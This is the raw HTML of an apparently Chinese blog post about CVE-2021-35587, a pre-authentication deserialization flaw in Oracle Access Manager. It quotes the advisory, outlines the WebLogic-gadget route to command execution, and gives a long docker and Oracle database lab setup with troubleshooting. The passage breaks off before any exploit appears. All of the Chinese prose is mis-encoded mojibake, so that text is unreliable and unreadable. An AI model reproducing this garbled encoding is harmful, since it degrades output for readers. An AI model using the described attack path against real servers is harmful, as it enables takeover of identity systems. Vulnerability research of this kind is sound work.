<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>CVE-2021-35587ï¼šOracle Access Managerååºåˆ—åŒ–æ¼æ´ | é—²è¨€è¯­</title><meta name=keywords content><meta name=description content="æ¼æ´æ¦‚å†µ CVEå…¬å‘Š
Vulnerability in the Oracle Access Manager product of Oracle Fusion Middleware (component: OpenSSO Agent). Supported versions that are affected are 11.1.2.3.0, 12.2.1.3.0 and 12.2.1.4.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle Access Manager. Successful attacks of this vulnerability can result in takeover of Oracle Access Manager. CVSS 3.1 Base Score 9.8 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).
â€”â€” https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-35587"><meta name=author content><link rel=canonical href=https://ret2neo.cn/post/230515-oracle-access-manager-cve-2021-35587/><link crossorigin=anonymous href=/assets/css/stylesheet.42b1e004fb78db2fc933d33c9db659598f62453f0de6f9db50c85e5936c0d8c3.css integrity="sha256-QrHgBPt42y/JM9M8nbZZWY9iRT8N5vnbUMheWTbA2MM=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://ret2neo.cn/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://ret2neo.cn/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://ret2neo.cn/favicon-32x32.png><link rel=apple-touch-icon href=https://ret2neo.cn/apple-touch-icon.png><link rel=mask-icon href=https://ret2neo.cn/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="CVE-2021-35587ï¼šOracle Access Managerååºåˆ—åŒ–æ¼æ´"><meta property="og:description" content="æ¼æ´æ¦‚å†µ CVEå…¬å‘Š
Vulnerability in the Oracle Access Manager product of Oracle Fusion Middleware (component: OpenSSO Agent). Supported versions that are affected are 11.1.2.3.0, 12.2.1.3.0 and 12.2.1.4.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle Access Manager. Successful attacks of this vulnerability can result in takeover of Oracle Access Manager. CVSS 3.1 Base Score 9.8 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).
â€”â€” https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-35587"><meta property="og:type" content="article"><meta property="og:url" content="https://ret2neo.cn/post/230515-oracle-access-manager-cve-2021-35587/"><meta property="article:section" content="post"><meta property="article:published_time" content="2022-07-14T19:40:55+08:00"><meta property="article:modified_time" content="2022-07-14T19:40:55+08:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="CVE-2021-35587ï¼šOracle Access Managerååºåˆ—åŒ–æ¼æ´"><meta name=twitter:description content="æ¼æ´æ¦‚å†µ CVEå…¬å‘Š
Vulnerability in the Oracle Access Manager product of Oracle Fusion Middleware (component: OpenSSO Agent). Supported versions that are affected are 11.1.2.3.0, 12.2.1.3.0 and 12.2.1.4.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle Access Manager. Successful attacks of this vulnerability can result in takeover of Oracle Access Manager. CVSS 3.1 Base Score 9.8 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).
â€”â€” https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-35587"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://ret2neo.cn/post/"},{"@type":"ListItem","position":2,"name":"CVE-2021-35587ï¼šOracle Access Managerååºåˆ—åŒ–æ¼æ´","item":"https://ret2neo.cn/post/230515-oracle-access-manager-cve-2021-35587/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"CVE-2021-35587ï¼šOracle Access Managerååºåˆ—åŒ–æ¼æ´","name":"CVE-2021-35587ï¼šOracle Access Managerååºåˆ—åŒ–æ¼æ´","description":"æ¼æ´æ¦‚å†µ CVEå…¬å‘Š\nVulnerability in the Oracle Access Manager product of Oracle Fusion Middleware (component: OpenSSO Agent). Supported versions that are affected are 11.1.2.3.0, 12.2.1.3.0 and 12.2.1.4.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle Access Manager. Successful attacks of this vulnerability can result in takeover of Oracle Access Manager. CVSS 3.1 Base Score 9.8 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).\nâ€”â€” https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-35587","keywords":[],"articleBody":"æ¼æ´æ¦‚å†µ CVEå…¬å‘Š\nVulnerability in the Oracle Access Manager product of Oracle Fusion Middleware (component: OpenSSO Agent). Supported versions that are affected are 11.1.2.3.0, 12.2.1.3.0 and 12.2.1.4.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle Access Manager. Successful attacks of this vulnerability can result in takeover of Oracle Access Manager. CVSS 3.1 Base Score 9.8 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).\nâ€”â€” https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-35587\nOAMæ˜¯ä»€ä¹ˆ\nOracle Access Manager (OAM) æä¾›èº«ä»½ç®¡ç†ï¼ˆä½¿ç”¨ç”¨æˆ·ã€ç»„å’Œæœºæ„ç®¡ç†ã€è‡ªåŠ©æœåŠ¡ã€æµç¨‹ç®¡ç†åŠŸèƒ½å’Œå§”æ‰˜ç®¡ç†ï¼‰ã€éªŒè¯å’ŒæˆæƒæœåŠ¡ï¼Œä»¥åŠåˆè§„æ€§æŠ¥å‘Šã€‚\nå¯ä»¥ç†è§£ä¸ºOracleç”Ÿæ€ä¸­ä¸€å¥—å•ç‚¹ç™»é™†ç³»ç»Ÿã€‚\nCVE-2021-35587èƒ½è¾¾æˆä»€ä¹ˆæ•ˆæœ\nåˆ©ç”¨è¯¥æ¼æ´ï¼Œä»»æ„èƒ½å¤Ÿè®¿é—®OAMçš„æ”»å‡»è€…ï¼Œæ— éœ€è®¤è¯å³å¯æ”»å OAMServerã€‚\nCVE-2021-35587çš„å½±å“ç‰ˆæœ¬æœ‰å“ªäº›\n11.1.2.3.0, 12.2.1.3.0, 12.2.1.4.0\nâ€”â€”https://www.oracle.com/security-alerts/cpujan2022.html#AppendixFMW\nåŸºæœ¬åŸç†\nè¿™æ˜¯ä¸€ä¸ªJavaåŸç”Ÿååºåˆ—åŒ–æ¼æ´ï¼Œæ¥å—å’Œå¤„ç†ååºåˆ—åŒ–æ•°æ®çš„æ¥å£æ˜¯æ— è®¤è¯çš„ã€‚\nå› ä¸ºOAMåŒ…å«weblogicï¼Œæ‰€ä»¥ååºåˆ—åŒ–è¿‡ç¨‹å¯ä»¥å€ŸåŠ©weblogicçš„gadgetè¾¾æˆä»»æ„Javaä»£ç æ‰§è¡Œï¼Œè¿›è€Œæ‰§è¡Œä»»æ„å‘½ä»¤ä»¥æ”»å æœåŠ¡å™¨ï¼Œgetshellå’Œæ¨ªå‘ç§»åŠ¨ã€‚\næœ¬åœ°æ­å»ºOAM å› ä¸ºè¿™æ˜¯ä¸€å¥—ç›¸å¯¹å¤æ‚çš„ç¯å¢ƒï¼Œæ‰€ä»¥æ­å»ºå¯ç”¨çš„OAMè°ƒè¯•åˆ†æç¯å¢ƒåœ¨åˆ©ç”¨CVE-2021-35587è¿™ä¸ªæ¼æ´çš„è¿‡ç¨‹ä¸­å æ®äº†ç›¸å½“å¤§ä¸€éƒ¨åˆ†æ—¶é—´ã€‚åœ¨è¿™ä¸€ç‚¹ä¸Šï¼Œæ¼æ´åŸä½œè€…å’Œæˆ‘æœ‰åŒæ ·çš„ä½“ä¼šã€‚ä¸ºäº†èŠ‚çœåæ¥çš„åˆ†æè€…ï¼Œä»¥åŠä»¥åçš„è‡ªå·±çš„å®è´µçš„æ—¶é—´ï¼Œæˆ‘æŠŠOAMç¯å¢ƒæ­å»ºæ–¹æ³•å’Œæ­å»ºè¿‡ç¨‹ä¸­è¸©åˆ°çš„å„ç§å„æ ·çš„å‘æ€»ç»“åœ¨æ­¤ã€‚\nå¤§çº² å‚è€ƒ https://docs.oracle.com/en/middleware/idm/access-manager/12.2.1.4/tutorial-oam-docker/#Background ä½¿ç”¨æ–¹æ³•2è·å–OAMé•œåƒ\nDownload a prebuilt OAM image from Oracle Container Registry by by navigating to Middleware \u003e oam. This image contains no patches and should only be used in Developer or Test environments. ä¸‹è½½åˆ°çš„OAMé•œåƒç”¨äºè·‘èµ·æ¥ä¸‰ä¸ªOAMå®¹å™¨\nWebLogic Administration Server (AdminServer) OAM Managed Server (oam_server1) OAM Policy Manager Managed Server (oam_policy_mgr1) è·‘èµ·æ¥è¿™ä¸‰ä¸ªå®¹å™¨ä¾èµ–ä¸€ä¸ªå¯ç”¨çš„Oracleæ•°æ®åº“\næ­¥éª¤æ±‡æ€» åˆ›å»ºä¸€å°å…¨æ–°çš„Ubuntu18.04ï¼Œåˆ‡æ¢åˆ°rootç”¨æˆ·ã€‚\nåœ¨ https://hub.docker.com/_/oracle-database-enterprise-edition å’Œ https://container-registry.oracle.com/ ç™»å½•è´¦å·ååŒæ„åè®®ã€‚ï¼ˆå‚è€ƒæ­¥éª¤äºŒï¼‰\nå®‰è£…docker\n1 2 # apt update # apt install docker.io docker ç™»å½•dockerhub å’Œ container-registry.oracle.com\n1 2 3 4 # ocker login è¾“å…¥ login.docker.com çš„è´¦å·å¯†ç \t# docker login container-registry.oracle.com è¾“å…¥ login.oracle.com çš„è´¦å·å¯†ç  æ‹‰å–ä¸¤ä¸ªé•œåƒ\n1 2 # docker pull store/oracle/database-enterprise:12.2.0.1 # docker pull container-registry.oracle.com/middleware/oam:12.2.1.4.0 ä¸€äº›å‡†å¤‡å·¥ä½œ\n1 2 3 # docker network create -d bridge OamNET # mkdir -p /scratch/user_projects # chmod 777 /scratch/user_projects å¯åŠ¨å››ä¸ªå®¹å™¨ï¼ˆæ³¨æ„ï¼šå°†ä»¥ä¸‹å‘½ä»¤ä¸­çš„172.17.0.1æ›¿æ¢ä¸ºdockerè™šæ‹Ÿç½‘å¡ç½‘å…³çš„IPï¼‰\n1 2 3 4 docker run -d -it --name myOracleDB -p 1521:1521 store/oracle/database-enterprise:12.2.0.1 docker run -d --network=OamNET -p 7001:7001 --name=oamadmin --env CONNECTION_STRING=172.17.0.1:1521/ORCLPDB1.localdomain --env ADMIN_LISTEN_HOST=oamadmin --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_PORT=7001 --env RCUPREFIX=OAM1 --env DB_USER=sys --env DB_PASSWORD=Oradoc_db1 --env DB_SCHEMA_PASSWORD=Oradoc_db2 -v /scratch/user_projects/:/u01/oracle/user_projects container-registry.oracle.com/middleware/oam:12.2.1.4.0 docker run -d -p 14100:14100 --network=OamNET --volumes-from oamadmin --name oamms --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_HOST=oamadmin --env ADMIN_LISTEN_PORT=7001 --env MANAGEDSERVER_PORT=14100 --env MANAGED_SERVER_CONTAINER=true --env MS_NAME=oam_server1 --env MS_HOST=oamms container-registry.oracle.com/middleware/oam:12.2.1.4.0 \"/u01/oracle/dockertools/startMS.sh\" docker run -d -p 15100:15100 --network=OamNET --volumes-from oamadmin --name oampolicy --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_HOST=oamadmin --env ADMIN_LISTEN_PORT=7001 --env MANAGEDSERVER_PORT=15100 --env MANAGED_SERVER_CONTAINER=true --env MS_NAME=oam_policy_mgr1 --env MS_HOST=oampolicy container-registry.oracle.com/middleware/oam:12.2.1.4.0 \"/u01/oracle/dockertools/startMS.sh\" æŸ¥çœ‹å„æœåŠ¡çš„IPåœ°å€\n1 docker inspect -f '{{.Name}} - {{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' oamadmin oamms oampolicy myOracleDB ä½¿ç”¨ä»¥ä¸‹é“¾æ¥è®¿é—®æœåŠ¡ã€‚ï¼ˆæ³¨æ„ï¼šå°†192.168.0.105æ›¿æ¢ä¸ºè™šæ‹ŸæœºIPï¼‰\n1 2 3 4 5 6 7 è´¦å·ï¼šweblogic å¯†ç ï¼šW3bl@gic WebLogic Administration Console http://192.168.0.105:7001/console Oracle Enterprise Manager Console http://192.168.0.105:7001/em Oracle Access Management Console http://192.168.0.105:7001/oamconsole OAM Server Logout http://192.168.0.105:14100/oam/server/logout Policy Manager Access http://192.168.0.105:15100/access â‘ è¿è¡ŒOracleæ•°æ®åº“ åˆ›å»ºOracleæ•°æ®åº“ å‚è€ƒ https://hub.docker.com/_/oracle-database-enterprise-edition ç™»é™†è´¦å·åè·³è½¬åˆ° https://hub.docker.com/u/findneo/content/sub-3762ef81-7448-4275-909b-df7e6b5d4070 ï¼ŒåŒæ„åè®®ã€‚\n1 2 3 4 5 6 7 8 # sudo docker login è¾“å…¥docker hubçš„è´¦å·å¯†ç  # sudo docker pull store/oracle/database-enterprise:12.2.0.1 æ‹‰å–é•œåƒ # sudo docker run -d -it --name myOracleDB -p 1521:1521 store/oracle/database-enterprise:12.2.0.1 è¿è¡Œèµ·æ¥ä¸€ä¸ªOracleæ•°æ®åº“ï¼Œå¹¶ä¸”å¼€æ”¾åˆ°æœ¬åœ°çš„1521ç«¯å£ æµ‹è¯•æ•°æ®åº“è¿æ¥ å®‰è£…sqlplus å‚è€ƒhttps://askubuntu.com/questions/159939/how-to-install-sqlplus\nstep1: 1 # sudo apt-get install alien step2: åœ¨ https://www.oracle.com/database/technologies/instant-client/linux-x86-64-downloads.html ä¸‹è½½3ä¸ªæ–‡ä»¶ oracle-instantclient12.2-basic-12.2.0.1.0-1.x86_64.rpm oracle-instantclient12.2-sqlplus-12.2.0.1.0-1.x86_64.rpm oracle-instantclient12.2-devel-12.2.0.1.0-1.x86_64.rpm\nstep3: 1 2 3 # sudo alien -i oracle-instantclient*-basic*.rpm # sudo alien -i oracle-instantclient*-sqlplus*.rpm # sudo alien -i oracle-instantclient*-devel*.rpm step4: 1 # sudo apt-get install libaio1 step5: 1 2 # sudo sensible-editor /etc/ld.so.conf.d/oracle.conf ç²˜è´´å³ä¾§å†…å®¹ï¼š /usr/lib/oracle/12.2/client64/lib/ step6: sudo ldconfig\nstep7 æµ‹è¯•é“¾æ¥ 1 2 # sqlplus64 sys/Oradoc_db1@//127.0.0.1:1521/ORCLCDB.localdomain as sysdba # sqlplus64 sys/Oradoc_db1@//172.17.0.1:1521/ORCLPDB1.localdomain as sysdba å…¶ä»–ï¼šsqlplus64çš„ç”¨æ³• sqlplus64çš„ç”¨æ³•ï¼šsqlplus [ [] [{logon | /nolog}] [] ]\nå…¶ä¸­ æ˜¯\n1 {[/][@] | / } [AS {SYSDBA | SYSOPER | SYSASM | SYSBACKUP | SYSDG | SYSKM | SYSRAC}] [EDITION=value] å…¶ä¸­å¯ä»¥æ˜¯å¦‚ä¸‹æ ¼å¼ @[ | [//]Host[:Port]/]\nå¦‚ä½•çŸ¥é“ service_name æˆ–è€… net_service_nameï¼ŸOracleæ•°æ®åº“å®¹å™¨é•œåƒæ–‡æ¡£ è¯´service_nameå®šä¹‰åœ¨ç¯å¢ƒå˜é‡TNS_ADMINå®šä¹‰çš„ç›®å½•ä¸‹çš„tnsnames.oraæ–‡ä»¶ä¸­ï¼Œ è¿›å®¹å™¨çœ‹åˆ° TNS_ADMIN=/u01/app/oracle/product/12.2.0/dbhome_1/admin/ORCLCDB ï¼Œtnsnames.oraæ–‡ä»¶å†…å®¹ä¸º\n1 2 ORCLCDB = (DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST = 0.0.0.0)(PORT = 1521)) (CONNECT_DATA = (SERVER = DEDICATED) (SERVICE_NAME = ORCLCDB.localdomain) ) ) ORCLPDB1 = (DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST = 0.0.0.0)(PORT = 1521)) (CONNECT_DATA = (SERVER = DEDICATED) (SERVICE_NAME = ORCLPDB1.localdomain) ) ) æ‰€ä»¥ SERVICE_NAME å¯ä»¥æ˜¯ ORCLCDB.localdomain æˆ–è€… ORCLPDB1.localdomain ã€‚\nâ‘¡ä¸‹è½½OAMé•œåƒ è¿›å…¥ https://container-registry.oracle.com/ ï¼Œç‚¹å‡»å³ä¸Šè§’Sign Inï¼Œç™»é™†è‡ªå·±çš„Oracleè´¦å·ï¼Œç„¶åç‚¹å‡»MiddleWareï¼Œç„¶åç‚¹å‡»OAMã€‚\nåœ¨å³ä¾§åŒºåŸŸåŒæ„åè®®ï¼Œç„¶åæ‰å¯ä»¥ä¸‹è½½ã€‚\nå¦åˆ™å³ä½¿docker loginï¼Œè¿˜æ˜¯æ— æ³•ä¸‹è½½ï¼Œä¼šæç¤º\nError response from daemon: pull access denied for container-registry.oracle.com/middleware/oam, repository does not exist or may require â€˜docker loginâ€™: denied: requested access to the resource is deniedã€‚\nåŒæ„åè®®ä¹‹åæ‰§è¡Œä»¥ä¸‹å‘½ä»¤\n1 # sudo docker login container-registry.oracle.com è¾“å…¥åœ¨Oracleæ³¨å†Œçš„è´¦å·å¯†ç \n1 # sudo docker pull container-registry.oracle.com/middleware/oam:12.2.1.4.0 â‘¢åˆ›å»ºå®¹å™¨ä¸€oamadmin å‚è€ƒæ•™ç¨‹åˆ›å»ºOAM Administration Server Containerï¼Œå…¶ä¸­åŒ…å«WebLogic å’ŒOAM Consoles.\n1 2 3 4 5 6 7 8 sudo docker images sudo docker network create -d bridge OamNET # 14f104a67b0819335f9490dadc3e4003540bcdbb7b19436b2aea56250a5f2713 sudo mkdir -p /scratch/user_projects sudo chmod 777 /scratch/user_projects sudo docker run -d --network=OamNET -p 7001:7001 --name=oamadmin --env CONNECTION_STRING=127.0.0.1:1521/ORCLCDB.localdomain --env ADMIN_LISTEN_HOST=oamadmin --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=password --env ADMIN_LISTEN_PORT=7001 --env RCUPREFIX=OAM1 --env DB_USER=sys --env DB_PASSWORD=Oradoc_db1 --env DB_SCHEMA_PASSWORD=password -v /scratch/user_projects/:/u01/oracle/user_projects container-registry.oracle.com/middleware/oam:12.2.1.4.0 å¯èƒ½ä¼šè¿ä¸ä¸Šï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è°ƒè¯•ï¼Œçœ‹çœ‹é”™è¯¯æ˜¯ä»€ä¹ˆ\n1 sudo docker run --rm --network=OamNET -p 7001:7001 --name=oamadmin --env CONNECTION_STRING=127.0.0.1:1521/ORCLCDB.localdomain --env ADMIN_LISTEN_HOST=oamadmin --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=password --env ADMIN_LISTEN_PORT=7001 --env RCUPREFIX=OAM1 --env DB_USER=sys --env DB_PASSWORD=Oradoc_db1 --env DB_SCHEMA_PASSWORD=password -v /scratch/user_projects/:/u01/oracle/user_projects container-registry.oracle.com/middleware/oam:12.2.1.4.0 æŠ¥é”™åŠè§£å†³ æŠ¥é”™ä¸€ï¼šæ— æ³•è¿æ¥æ•°æ®åº“ 1 2 Unable to connect to the database using the provided details. Enter a valid hostname and port or check if the listener is up and running è§£å†³ä¸€ï¼šä½¿ç”¨æ­£ç¡®çš„IP éœ€è¦æ³¨æ„CONNECTION_STRINGæ˜¯ä»æ–°å»ºçš„å®¹å™¨ä¸­è®¿é—®çš„ï¼Œæ‰€ä»¥ç»™çš„IPåº”è¯¥æ˜¯å®¹å™¨ç½‘å¡çš„ç½‘å…³æˆ–è€…ä¸»æœºçš„ï¼Œæ¯”å¦‚ 172.17.0.1ï¼Œè€Œä¸æ˜¯127.0.0.1ã€‚\næŠ¥é”™äºŒï¼šæ— æ³•è¿æ¥CDB 1 The selected Oracle database is a multitenant container database (CDB). Connecting to a multitenant container database (CDB) is not supported. Instead, connect to a valid pluggable database (PDB). è§£å†³äºŒï¼šä½¿ç”¨PDB PDBå’ŒCDBæ˜¯Oracle12çš„æ–°ç‰¹æ€§ï¼ŒCDBæ˜¯å¤šç§Ÿçš„ã€‚Oracle æ•°æ®åº“ 12 c å¤šç§Ÿæˆ·é€‰é¡¹å…è®¸å•ä¸ªå®¹å™¨æ•°æ®åº“ ï¼ˆCDBï¼‰ æ¥æ‰¿è½½å¤šä¸ªå•ç‹¬çš„å¯æ’æ‹”æ•°æ®åº“ (PDB)ã€‚\nâ€”â€”https://www.cnblogs.com/kerrycode/p/3386917.html\nä½¿ç”¨ä»¥ä¸‹è¯­å¥æŸ¥çœ‹è‡ªå·±æ˜¯å¦æ˜¯æ‰€ç§Ÿæ•°æ®åº“\n1 select name, decode(cdb, 'YES', 'Multitenant Option enabled', 'Regular 12c Database: ') \"Multitenant Option\" , open_mode, con_id from v$database; ç»“æœ\n1 2 3 NAME Multitenant Option OPEN_MODE CON_ID --------- -------------------------- -------------------- ---------- ORCLCDB Multitenant Option enabled READ WRITE 0 æˆ–è€…ç›´æ¥\n1 select cdb from v$database YESè¡¨ç¤ºè¯¥æ•°æ®åº“æ˜¯CDB,å¦‚æœæ˜¯NOè¡¨ç¤ºæ˜¯NO-CDB(æ™®é€šæ•°æ®åº“)\næˆ–è€…æ‰§è¡Œ\n1 show pdbs; ç»“æœ\n1 2 3 CON_ID CON_NAME OPEN MODE RESTRICTED ---------- ------------------------------ ---------- ---------- 2 PDB$SEED READ ONLY NO æœç´¢ â€œhow to connect to pdb directlyâ€ ï¼Œå‚è€ƒæ­¤æ–‡ æƒ³åˆ°é€šè¿‡æ–°å»ºæœåŠ¡è¿æ¥åˆ°PDBã€‚ç„¶åæ³¨æ„åˆ°/u01/app/oracle/product/12.2.0/dbhome_1/admin/ORCLCDB/tnsnames.ora æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼Œå…¶ä¸­å·²ç»åŒ…æ‹¬ä¸¤ä¸ªServiceã€‚\n1 2 ORCLCDB = (DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST = 0.0.0.0)(PORT = 1521)) (CONNECT_DATA = (SERVER = DEDICATED) (SERVICE_NAME = ORCLCDB.localdomain) ) ) ORCLPDB1 = (DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST = 0.0.0.0)(PORT = 1521)) (CONNECT_DATA = (SERVER = DEDICATED) (SERVICE_NAME = ORCLPDB1.localdomain) ) ) æ‰€ä»¥åªè¦ï¼Œåˆ›å»ºå®¹å™¨æ—¶CONNECTION_STRING ä½¿ç”¨ 172.17.0.1:1521/ORCLPDB1.localdomain è€Œä¸æ˜¯ 172.17.0.1:1521/ORCLCDB.localdomain å°±èƒ½è§£å†³è¿™ä¸ªé”™è¯¯ã€‚\næŠ¥é”™ä¸‰ï¼šæ— æ³•æ‰§è¡ŒSQL 1 2 3 ERROR - RCU-6005 Unable to execute sql query. CAUSE - RCU-6005 Database not in open state. ACTION - RCU-6005 Make sure that the database is open. è§£å†³ä¸‰ï¼šæ‰“å¼€PDB ä¸ºäº†è§£å†³æŠ¥é”™è€Œèƒ¡ä¹±æ“ä½œäº†æ•°æ®åº“ï¼Œå…¶ä¸­ä¸€ä¸ªåŠ¨ä½œå…³é—­äº†PDBï¼Œä»è€Œå¯¼è‡´äº†è¿™ä¸ªé”™è¯¯ã€‚æ‰“å¼€å®ƒå°±å¥½äº†ã€‚\nSQL\u003e select name,open_mode from v$pdbs;\n1 2 3 4 5 6 NAME -------------------------------------------------------------------------------- OPEN_MODE ---------- ORCLPDB1 MOUNTED SQL\u003e alter pluggable database ORCLPDB1 open;\n1 Pluggable database altered. SQL\u003e select name,open_mode from v$pdbs;\n1 2 3 4 5 6 NAME -------------------------------------------------------------------------------- OPEN_MODE ---------- ORCLPDB1 READ WRITE æŠ¥é”™å››ï¼šåˆ›å»ºdomainå¤±è´¥ æ—¥å¿—è¯¦æƒ…ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 CONNECTION_STRING=172.17.0.1:1521/ORCLPDB1.localdomain RCUPREFIX=OAM1 DOMAIN_HOME=/u01/oracle/user_projects/domains/access_domain INFO: Admin Server not configured. Will run RCU and Domain Configuration Phase... Configuring Domain for first time Start the Admin and Managed Servers ===================================== Loading RCU Phase ================= CONNECTION_STRING=172.17.0.1:1521/ORCLPDB1.localdomain RCUPREFIX=OAM1 jdbc_url=jdbc:oracle:thin:@172.17.0.1:1521/ORCLPDB1.localdomain Creating Domain 1st execution Loading RCU into database with RCUPREFIX OAM1 Domain Configuration Phase ========================== /u01/oracle/oracle_common/common/bin/wlst.sh -skipWLSModuleScanning /u01/oracle/dockertools/create_domain.py -oh /u01/oracle -jh /u01/jdk -parent /u01/oracle/user_projects/domains -name access_domain -user weblogic -password password -rcuDb 172.17.0.1:1521/ORCLPDB1.localdomain -rcuPrefix OAM1 -rcuSchemaPwd password -isSSLEnabled true Cmd is /u01/oracle/oracle_common/common/bin/wlst.sh -skipWLSModuleScanning /u01/oracle/dockertools/create_domain.py -oh /u01/oracle -jh /u01/jdk -parent /u01/oracle/user_projects/domains -name access_domain -user weblogic -password password -rcuDb 172.17.0.1:1521/ORCLPDB1.localdomain -rcuPrefix OAM1 -rcuSchemaPwd password -isSSLEnabled true Initializing WebLogic Scripting Tool (WLST) ... Welcome to WebLogic Server Administration Scripting Shell Type help() for help on available commands create_domain.py called with the following inputs: INFO: sys.argv[0] = /u01/oracle/dockertools/create_domain.py INFO: sys.argv[1] = -oh INFO: sys.argv[2] = /u01/oracle INFO: sys.argv[3] = -jh INFO: sys.argv[4] = /u01/jdk INFO: sys.argv[5] = -parent INFO: sys.argv[6] = /u01/oracle/user_projects/domains INFO: sys.argv[7] = -name INFO: sys.argv[8] = access_domain INFO: sys.argv[9] = -user INFO: sys.argv[10] = weblogic INFO: sys.argv[11] = -password INFO: sys.argv[12] = password INFO: sys.argv[13] = -rcuDb INFO: sys.argv[14] = 172.17.0.1:1521/ORCLPDB1.localdomain INFO: sys.argv[15] = -rcuPrefix INFO: sys.argv[16] = OAM1 INFO: sys.argv[17] = -rcuSchemaPwd INFO: sys.argv[18] = password INFO: sys.argv[19] = -isSSLEnabled INFO: sys.argv[20] = true INFO: Creating Admin server... INFO: Enabling SSL PORT for AdminServer... Error: set() failed. Do dumpStack() to see details. Error: runCmd() failed. Do dumpStack() to see details. Problem invoking WLST - Traceback (innermost last): File \"/u01/oracle/dockertools/create_domain.py\", line 513, in ? File \"/u01/oracle/dockertools/create_domain.py\", line 123, in createOAMDomain File \"/u01/oracle/dockertools/create_domain.py\", line 184, in createBaseDomain File \"/tmp/WLSTOfflineIni5785928536971827845.py\", line 79, in set File \"/tmp/WLSTOfflineIni5785928536971827845.py\", line 19, in command at com.oracle.cie.domain.script.jython.CommandExceptionHandler.handleException(CommandExceptionHandler.java:69) at com.oracle.cie.domain.script.jython.WLScriptContext.handleException(WLScriptContext.java:3085) at com.oracle.cie.domain.script.jython.WLScriptContext.runCmd(WLScriptContext.java:738) at sun.reflect.GeneratedMethodAccessor132.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) com.oracle.cie.domain.script.jython.WLSTException: com.oracle.cie.domain.script.jython.WLSTException Domain Creation Failed.. Please check the Domain Logs å¯ä»¥ä»48è¡Œçœ‹åˆ°æ˜¯åœ¨ Creating Admin server... é˜¶æ®µå‡ºé”™çš„ã€‚\nè§£å†³å››ï¼šæé«˜ADMIN_PASSWORD å¯†ç å¤æ‚åº¦ éœ€è¦æ³¨æ„çš„æ˜¯æ¯æ¬¡å¤±è´¥é‡è¯•ä¹‹å‰è¦å…ˆåˆ é™¤ä¹‹å‰ç•™ä¸‹çš„ç—•è¿¹ã€‚\n1 2 sudo docker rm oamadmin sudo rm -rf /scratch/user_projects/* ä»è¿™é‡Œ https://github.com/oracle/docker-images/issues/844#issuecomment-389884511 çœ‹åˆ°å¯èƒ½æ˜¯å¯†ç 